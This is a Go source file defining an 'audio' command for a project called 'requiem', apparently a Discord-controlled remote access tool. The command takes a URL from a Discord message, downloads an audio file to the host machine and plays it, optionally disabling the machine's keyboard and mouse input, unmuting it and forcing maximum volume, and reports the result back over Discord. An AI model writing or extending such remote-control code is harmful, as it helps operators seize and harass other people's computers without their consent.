package commands

import (
	"fmt"
	"io"
	"os"
	"path/filepath"
	"strings"

	"requiem/funcs"
	"requiem/store"
	"requiem/utils"
	"requiem/utils/discord"

	"github.com/hajimehoshi/go-mp3"
	"github.com/hajimehoshi/oto"
)

var (
	context *oto.Context
	inited  bool = false
)

func (*AudioCommand) Exec(ctx *store.CommandContext, args []string) {
	urls := discord.GetUrls(ctx)
	if len(urls) == 0 {
		ctx.ReplyMsg("🟥 Failed to find any urls.")
		return
	}

	theUrl := ""

	for _, url := range urls {
		ext := filepath.Ext(strings.Split(url, "?")[0])
		if ext != ".mp3" && ext != ".wav" && ext != ".m4a" {
			continue
		}

		theUrl = url
		break
	}

	if theUrl == "" {
		ctx.ReplyMsg("🟥 Failed to find any audio files.")
		return
	}

	path, err := utils.DownloadFile(theUrl, "")
	if err != nil {
		ctx.ReplyMsg(fmt.Sprintf("🟥 Failed to download - %s", err))
		return
	}

	defer os.Remove(path)

	file, err := os.Open(path)
	if err != nil {
		ctx.ReplyMsg(fmt.Sprintf("🟥 Failed to open file - %s", err))
		return
	}

	defer file.Close()

	decoder, err := mp3.NewDecoder(file)
	if err != nil {
		ctx.ReplyMsg(fmt.Sprintf("🟥 Failed to decode audio - %s", err))
		return
	}

	if !inited {
		context, err = oto.NewContext(decoder.SampleRate(), 2, 2, 8192)
		if err != nil {
			ctx.ReplyMsg(fmt.Sprintf("🟥 Failed to create audio context - %s", err))
			return
		}

		inited = true
	}

	initial, _ := ctx.ReplyMsg("Playing audio...")

	if store.RuntimeSettings.AudioDisableInputsUntilFinished {
		funcs.DisableInputs(true)
	}

	if store.RuntimeSettings.AudioUnmuteBeforePlay {
		funcs.SetMuted(false)
	}

	if store.RuntimeSettings.AudioMaxVolumeBeforePlay {
		funcs.SetVolume(1)
	}

	player := context.NewPlayer()
	defer player.Close()

	buffer := make([]byte, 4096)

	for {
		at, err := decoder.Read(buffer)
		if err == io.EOF {
			break
		}

		if err != nil {
			ctx.DeleteMsg(initial.ID)
			ctx.ReplyMsg(fmt.Sprintf("🟥 Failed to read audio - %s", err))
			return
		}

		_, err = player.Write(buffer[:at])
		if err != nil {
			ctx.DeleteMsg(initial.ID)
			ctx.ReplyMsg(fmt.Sprintf("🟥 Failed to write audio data - %s", err))
			return
		}
	}

	if store.RuntimeSettings.AudioDisableInputsUntilFinished {
		funcs.DisableInputs(false)
	}

	ctx.DeleteMsg(initial.ID)
	ctx.ReplyMsg("🟩 Successfully played audio.")
}

func (*AudioCommand) Name() string {
	return "audio"
}

func (*AudioCommand) Info() string {
	return "Plays audio."
}

type AudioCommand struct{}
